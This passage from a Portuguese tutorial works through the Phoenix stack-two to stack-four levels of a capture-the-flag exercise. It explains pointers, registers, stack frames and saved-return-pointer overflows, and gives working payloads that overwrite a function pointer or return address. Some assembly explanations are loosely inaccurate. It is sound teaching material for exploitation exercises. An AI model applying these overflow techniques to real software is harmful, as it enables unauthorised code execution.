</code></pre>
<p>Uhuuu, esse foi mais f√°cil :D</p>
<h1><a class="header" href="#-solu√ß√£o-2" id="-solu√ß√£o-2">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<h1><a class="header" href="#-objetivo-2" id="-objetivo-2">üéØ Objetivo</a></h1>
<p>Usar um pointer para retornar para uma fun√ß√£o pre existente</p>
<h1><a class="header" href="#-dica-1" id="-dica-1">üí° Dica</a></h1>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<h1><a class="header" href="#-explica√ß√£o-3" id="-explica√ß√£o-3">üí´ Explica√ß√£o</a></h1>
<ul>
<li>O que raios s√£o pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<h3><a class="header" href="#-o-que-raios-s√£o-pointers" id="-o-que-raios-s√£o-pointers">‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers</a></h3>
<blockquote>
<p>Pointers s√£o uma estrutura que, ao inv√©s de armazenar dados, armazena o endere√ßo de outra estrutura.
Lembra do exemplo do po√ßo? Que cada item tinha seu endere√ßo na stack! Ent√£o, um pointer armazena esse endere√ßo! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade est√° em Y dire√ß√£o.</p>
<p>Colunas: Nome da Variavel | Endere√ßo | conte√∫do</p>
<p><img src="stack/phoenix/./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A vari√°vel &quot;a&quot; √© um pointer que armazena a localiza√ß√£o da variavel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; est√° apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia √° &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto √©: Seguir a dire√ß√£o que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caractere &quot;&amp;&quot; indica uma refer√™ncia, e o caractere &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso voc√™ tente desrefenciar um pointer que n√£o aponta pra nada (NULL),
o programa vai interromper a execu√ß√£o e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, voc√™ vai ver &quot;Null Checks&quot; 
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<h3><a class="header" href="#-function-pointers" id="-function-pointers">ü¶Ä Function Pointers</a></h3>
<blockquote>
<p>Function pointers, ao env√©s de armazenar o endere√ßo de uma vari√°vel, armazenam o endere√ßo de uma fun√ß√£o! :D</p>
</blockquote>
<p>Sim! Fun√ß√µes tamb√©m s√£o armazenadas na Stack, e possuem seu endere√ßo! Esse endere√ßo pode ser encontrado por varios m√©todos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_fun√ß√£o&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois metodos ser√£o demonstrados em breve! :D</p>
<h3><a class="header" href="#-exploit" id="-exploit">üî• Exploit</a></h3>
<blockquote>
<p>Buffer overflow, alterarando o valor de um function pointer, redirecionando a execu√ß√£o do programa.</p>
<p>Em lingua n√£o nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execu√ß√£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<h4><a class="header" href="#-analisando-o-programa" id="-analisando-o-programa">üõ∏ Analisando o programa</a></h4>
<pre><code class="language-C">fun√ß√£o complete_level() {   // a fun√ß√£o que a gente quer chamar
.......
}

fun√ß√£o main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // fun√ß√£o INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endere√ßo salvo em fp como se fosse uma fun√ß√£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>N√≥s queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endere√ßo.</p>
<p>E n√≥s j√° sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Ent√£o t√° na hora do trabalho!</p>
<h4><a class="header" href="#-encontrando-o-endere√ßo-da-fun√ß√£o" id="-encontrando-o-endere√ßo-da-fun√ß√£o">üè† Encontrando o endere√ßo da fun√ß√£o</a></h4>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endere√ßos
                  ( O -d √© pra ativar a disassembly: Converter de machine code para algo legivel )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padr√£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endere√ßo
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endere√ßo da fun√ß√£o √© 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta aten√ß√£o na quantidade de null bytes que precedem o endere√ßo. Todo pointer come√ßa com pelo menos dois null bytes, 
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (n√≥s), de definir um pointer novo, pois quebraria a string do nosso 
input. N√≥s precisamos usar um que j√° esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e n√≥s s√≥ vamos mudar os bytes finais dele
(Inteiro escreve na dire√ß√£o LE, lembra? Ent√£o n√£o vai inteferir com os NULLs que vem antes)</p>
<p>Portanto n√£o precisamos nos preocupar com isso nesse desafio!</p>
<h4><a class="header" href="#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit">üòê Cansei de teoria eu quero exploit</a></h4>
<p>Se voc√™ quer tentar por conta propria, agora √© sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Ent√£o...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que voc√™ tenha gostado! :D</p>
<h1><a class="header" href="#-solu√ß√£o-3" id="-solu√ß√£o-3">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three </p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<h1><a class="header" href="#-objetivo-3" id="-objetivo-3">üéØ Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execu√ß√£o do programa.</p>
<p>Esse desafio est√° nos preparando para o pr√≥ximo, no qual nos redirecionaremos a execu√ß√£o para o nosso pr√≥prio c√≥digo, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era vi√°vel nos anos 90, quando mecanismos de prote√ß√£o n√£o existiam. Por isso √© chamado de buffer overflow cl√°ssico (ou <code>SRP BOF</code>, 
caso voc√™ goste de siglas)! :D</p>
<p>Se voc√™ souber ingl√™s, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1><a class="header" href="#-conhecimento-preliminar" id="-conhecimento-preliminar">üõ∏ Conhecimento preliminar</a></h1>
<p>Se tem uma se√ß√£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguran√ßa est√° firme e travado,
mantenha as m√£os, pernas e canecas de caf√© dentro do ve√≠culo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2><a class="header" href="#-assembly" id="-assembly">ü§ñ Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registradores - Introdu√ß√£o Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada √† assembly (ASM), por√©m isso √© para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq √© a melhor e se alguem te disser o contr√°rio, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM √© uma representa√ß√£o legivel dos 0s e 1s das instru√ß√µes do computador.
Ela pode ser transformada em machine code (c√≥digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Ent√£o como voc√™ pode imaginar, √© bem complicado, e a minha maneira de explicar pode n√£o funcionar para voc√™... Ent√£o vai com calma, le de outras fontes, assite 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3><a class="header" href="#-register-registros--registradores" id="-register-registros--registradores">üì¶ Register (Registros / Registradores)</a></h3>
<blockquote>
<p>Registers s√£o peda√ßos de mem√≥ria que ficam dentro do chip do processador,
semelhante a mem√≥ria RAM, por√©m extremamente r√°pidos e pequenos.</p>
</blockquote>
<p>O seu tamanho √© um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers s√£o semelhantes √† vari√°veis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4><a class="header" href="#-general-purpose-registers-gpr--registro-de-prop√≥sito-geral-" id="-general-purpose-registers-gpr--registro-de-prop√≥sito-geral-">üåç General Purpose Registers (GPR) ( Registro de Prop√≥sito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endere√ßos: 0 a 15) (uma vers√£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O prop√≥sito deles historicamente costumava ser, mas n√£o exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para opera√ß√µes_l√≥gicas ou aritm√©ticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras opera√ß√µes_c√≠clicas 
RDX Dados        -&gt; Multiplica√ß√£o, input/output
R8 a 15          -&gt; voc√™ s√≥ precisa saber que eles existem
</code></pre>
<p>Alem disso, s√£o usados para passar os argumentos para fun√ß√µes (explica√ß√£o em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ parametro)
RSI (2¬∫ parametro)
RDX (3¬∫ parametro)
...
</code></pre>
<p>Para os nossos proprositos, √© mais vantajoso considerar que eles s√≥ servem para 
armazenar valores e passar argumentos</p>
<h4><a class="header" href="#-address-register--armazenam-endere√ßos-da-stack-" id="-address-register--armazenam-endere√ßos-da-stack-">üí´ Address Register ( armazenam endere√ßos da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o 
								que est√° sendo executada 
</code></pre>
<h4><a class="header" href="#-rflag" id="-rflag">üèÅ RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de opera√ß√µes passadas.
Esses sinais s√£o 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posi√ß√£o    Nome         Descri√ß√£o 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matem√°tica)
6          Zero          A opera√ß√£o resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4><a class="header" href="#-ap√™ndice---curiosidade--nomenclatura-hist√≥rica" id="-ap√™ndice---curiosidade--nomenclatura-hist√≥rica">üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</a></h4>
<p><img src="stack/phoenix/./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamdo AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele √© chamado RAX e tem o tamanho de 2 EAX

Para propositos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tras das cenas, o computador interpreta EAX como a segunda metade do RAX

Ent√£o n√£o estranhe caso alguem fale de EIP numa
arquitetura x64, pois na linguagem informal n√£o faz diferen√ßa

Mas caso voc√™ v√° analisar o register em um debugger, a diferen√ßa importa :D
</code></pre>
<h3><a class="header" href="#-instru√ß√µes" id="-instru√ß√µes">‚ö° Instru√ß√µes</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu prop√≥sito na realidade n√£o √© relevante para a explica√ß√£o !</p>
</blockquote>
<p>As instru√ß√µes s√£o o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da opera√ß√£o vem primeiro e o &quot;par√¢metro&quot; depois</p>
<p>Caso os dois argumentos da instru√ß√£o sejam valores, a opera√ß√£o executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da opera√ß√£o ser√° salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtra√ß√£o 4 - 1 = 3
                 Caso fosse ao contr√°rio a ordem &quot;alvo&quot; &quot;par√¢metro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instru√ß√µes que ser√£o importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; S√≥ remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do par√¢metro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no ep√≠logo ( explicadas em breve )
           ret     -&gt; retorna da fun√ß√£o ( em ess√™ncia √© s√≥ um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores l√≥gicos, t√™m o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localiza√ß√£o incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ‚â§
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ‚â•
</code></pre>
<p>Caso vc n√£o saiba os operadores l√≥gicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador L√≥gico</a></p>
<h3><a class="header" href="#-fun√ß√µes-pr√≥logo-e-ep√≠logo" id="-fun√ß√µes-pr√≥logo-e-ep√≠logo">ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</a></h3>
<p>Agora t√° na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, ent√£o √© bom dar uma revisada, n√©?</p>
<h4><a class="header" href="#-revis√£o" id="-revis√£o">‚òï Revis√£o</a></h4>
<pre><code>- A stack √© como uma pilha de pratos: √∫ltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A mem√≥ria √© representada de cabe√ßa pra baixo!
    - A base fica em um endere√ßo maior (parte de baixo)
    - O topo fica em um endere√ßo menor (parte de cima)
    - Portanto, a stack cresce em dire√ß√£o √† valores menores :D 

</code></pre>
<h4><a class="header" href="#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-">üñºÔ∏è Stack Frame ( Moldura da Stack )</a></h4>
<p>Voc√™ se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A regi√£o entre os dois √© chamada de stack frame: um peda√ßo da stack :D</p>
<p>A stack como um todo possui v√°rios stack frames, por√©m s√≥ um est√° ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Pr√≥logo e Ep√≠logo, respectivamente.</p>
<blockquote>
<p>Obs: Quando voc√™ muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>fun√ß√£o()</strong>, precisamos criar um frame novo para ela por meio de um Pr√≥logo, e salvar o endere√ßo do frame atual. Ao retornar, esse frame ser√° destru√≠do com um Ep√≠logo e o antigo ser√° restaurado !</p>
<p>Para a explica√ß√£o, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly √© legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> s√£o definidas e nos j√° sabemos como isso funciona, agora vamos chamar a fun√ß√£o, que √© aonde a m√°gica acontece !</p>
<h4><a class="header" href="#-pr√≥logo" id="-pr√≥logo">üîí Pr√≥logo</a></h4>
<ul>
<li>Se a fun√ß√£o recever argumentos, passar eles
Chamar a fun√ß√£o </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a fun√ß√£o</li>
</ul>
<h5><a class="header" href="#se-a-fun√ß√£o-receber-argumentos-salvar-eles" id="se-a-fun√ß√£o-receber-argumentos-salvar-eles">Se a fun√ß√£o receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos s√£o passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ parametro)
RSI (2¬∫ parametro)
RDX (3¬∫ parametro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser nescess√°rio dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4><a class="header" href="#salvar-o-frame-atual" id="salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, por√©m n√£o o valor atual,
	       ; e sim o endere√ßo da pr√≥xima instru√ß√£o 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4><a class="header" href="#criar-novo-frame" id="criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp at√© o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; at√© o rsp
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localiz√ß√£o
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espa√ßo na mem√≥ria para essa fun√ß√£o </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a fun√ß√£o precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variaveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse m√©todo de chamar fun√ß√£o, n√£o importa a localiza√ß√£o da mem√≥ria de quando a fun√ß√£o foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma fun√ß√£o chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destru√≠do ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execu√ß√£o normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo ent√£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a fun√ß√£o
</code></pre>
<h4><a class="header" href="#-ep√≠logo" id="-ep√≠logo">üîë Ep√≠logo</a></h4>
<p>O epilogo √© bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instru√ß√µes               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp at√© o rbp)</p>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...                    
Variaveis print dois   A regi√£o n√£o √© apagada, pois consumiria processamento a toa!
...         O valores ficam largados l√° at√© uma nova fun√ß√£o escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatorio
...         Eles pode ser ignorado pois nem est√° mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> (remover o valor no topo da stack (ver acima por referencia), e colocalo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instru√ß√£o
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instru√ß√£o &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado gra√ßas ao rbp e rip salvos ( o rip salvo √© chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1><a class="header" href="#-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber" id="-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber">üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</a></h1>
<p>Existem algumas variaveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o que est√° sendo executada 
</code></pre>
<p>O RIP e o RBP atuais s√£o salvos na stack quando chamamos uma fun√ß√£o, junto das outras variaveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na fun√ß√£o
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos execicios anteriores, tambem conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execu√ß√£o do programa!</p>
<h1><a class="header" href="#-exploit-1" id="-exploit-1">üî• Exploit</a></h1>
<h2><a class="header" href="#-analisar-o-programa" id="-analisar-o-programa">üî¨ Analisar o programa</a></h2>
<p>O programa contem 3 fun√ß√µes: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do come√ßo do nivel e chama start_level</p>
<p><code>complete_level</code> √© a fun√ß√£o que precisamos chamar</p>
<p><code>start_level</code> √© onde a magica acontece: <code>gets()</code> (vulneravel) √© chamada num <code>buffer[64]</code></p>
<h2><a class="header" href="#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa">‚ÅâÔ∏è O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A fun√ß√£o normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip n√£o mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Ent√£o precisamos levar isso em considera√ß√£o, n√£o basta s√≥ olhar que o tamanho do buffer √© 64 e colcoar 64 bytes de <code>padding</code>!</p>
<p>Em aplica√ß√µes mais complexas, essa diferen√ßa pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferen√ßa usando ferramentas como fuzzers ou geradores de padr√£o...</p>
<p>Como nosso exemplo √© simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apo≈õ <strong>88</strong> bytes, temos o SRP :D</p>
<h2><a class="header" href="#-encontrar-endere√ßo-de-complete_level" id="-encontrar-endere√ßo-de-complete_level">üè† Encontrar endere√ßo de complete_level</a></h2>
<p>Voc√™ se lembra como faz? Nos usamos no execicio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora √© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endere√ßo:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dificil! Se voc√™ chegou at√© aqui, parabens! :D</p>
<h1><a class="header" href="#-solu√ß√£o-4" id="-solu√ß√£o-4">üí´ Solu√ß√£o</a></h1>
